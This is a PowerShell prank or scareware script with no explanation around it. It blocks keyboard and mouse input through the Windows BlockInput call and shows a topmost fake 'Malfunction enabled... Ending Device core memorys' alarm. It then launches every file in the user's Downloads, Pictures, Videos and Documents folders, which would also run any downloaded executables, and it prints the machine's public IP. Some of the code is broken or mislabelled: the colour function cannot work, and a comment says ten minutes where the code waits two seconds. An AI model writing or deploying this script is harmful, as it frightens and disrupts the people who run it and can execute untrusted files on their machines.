$publicIP = Invoke-RestMethod -Uri "http://api.ipify.org"
Write-Host "Your public IP address is: $publicIP"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class KeyboardBlocker {
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern bool BlockInput(bool fBlockIt);
    }
"@

# Function to change the color of everything
function Change-Color {
    $elements = @(
        [System.Windows.Forms.Application],
        [System.Windows.Forms.Form],
        [System.Drawing.Color],
        [System.Windows.Forms.Control]
    )
    
    foreach ($element in $elements) {
        $element.BackColor = [System.Drawing.Color]::Yellow
        $element.ForeColor = [System.Drawing.Color]::Red
    }

    # Set the text size for better visibility
    [System.Windows.Forms.Control]::DefaultFont = New-Object System.Drawing.Font("Arial", 20, [System.Drawing.FontStyle]::Bold)
}

# Function to display a message
function Show-Message {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Malfunction enabled"
    $form.Size = New-Object System.Drawing.Size(800, 600)
    $form.StartPosition = "CenterScreen"
    $form.TopMost = $true
    
    $label = New-Object System.Windows.Forms.Label
    $label.Text = "Malfunction enabled. Ending Device core memorys. Please hold..."
    $label.AutoSize = $true
    $label.Location = New-Object System.Drawing.Point(20, 20)
    $label.Font = New-Object System.Drawing.Font("Arial", 20, [System.Drawing.FontStyle]::Bold)
    $label.ForeColor = [System.Drawing.Color]::Red
    $form.Controls.Add($label)

    $form.ShowDialog()
}

# Function to disable the keyboard for 10 minutes
function Disable-Keyboard {
    [KeyboardBlocker]::BlockInput($true)
    Start-Sleep -Seconds 2  # Disables input for 10 minutes
    [KeyboardBlocker]::BlockInput($false)
}

# Main execution
Change-Color
Show-Message

# Disable keyboard
Disable-Keyboard

# Open all files in the Downloads folder and some other key directories
$directories = @(
    [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads'),
    [System.IO.Path]::Combine($env:USERPROFILE, 'Pictures'),
    [System.IO.Path]::Combine($env:USERPROFILE, 'Videos'),
    [System.IO.Path]::Combine($env:USERPROFILE, 'Documents')
)

foreach ($dir in $directories) {
    if (Test-Path $dir) {
        $files = Get-ChildItem -Path $dir
        foreach ($file in $files) {
            try {
                Start-Process $file.FullName
            } catch {
                Write-Host "Could not open: $($file.FullName)"
            }
        }
    }
}

$publicIP = Invoke-RestMethod -Uri "http://api.ipify.org"
Write-Host "Your public IP address is: $publicIP"
